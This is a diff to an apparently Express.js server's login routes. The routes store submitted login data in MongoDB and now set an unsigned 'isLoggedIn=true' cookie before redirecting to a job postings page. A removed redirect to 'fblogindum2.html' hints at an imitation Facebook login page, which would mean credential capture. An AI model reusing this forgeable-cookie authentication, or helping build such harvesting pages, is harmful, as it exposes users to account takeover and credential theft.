@@ -27,6 +27,7 @@ connectToDatabase();
 
 // Middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.json()); // Add this line to handle JSON requests
 app.use(express.static(__dirname)); // Serve static files from the "public" directory
 
 // Route to handle login form submission
@@ -50,8 +51,13 @@ app.post('/submit-login', async (req, res) => {
         
         // Log the result after successful insertion
         console.log("Data inserted successfully:", result);
-        
-        res.redirect(`/fblogindum2.html`);
+
+        // Set a cookie to indicate successful login
+        const expires = new Date(Date.now() + 60 * 60 * 1000).toUTCString(); // Cookie expires in 1 hour
+        res.setHeader('Set-Cookie', `isLoggedIn=true; expires=${expires}; path=/;`);
+
+        // Redirect to the job postings page after login
+        res.redirect('/Job Postings.html');
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
         res.status(500).send('Error saving data to MongoDB.');
@@ -82,7 +88,7 @@ app.post('/submit-additional-info', async (req, res) => {
         // Set a cookie to indicate successful login
         const expires = new Date(Date.now() + 60 * 60 * 1000).toUTCString(); // Cookie expires in 1 hour
         res.setHeader('Set-Cookie', `isLoggedIn=true; expires=${expires}; path=/;`);
-        res.redirect(`/Job Postings.html`); // Redirect to the job postings page after login
+        res.redirect('/Job Postings.html'); // Redirect to the job postings page after login
     } catch (error) {
         console.error('Error saving additional info to MongoDB:', error);
         return res.status(500).json({ success: false, message: 'Error saving additional info to MongoDB.' });
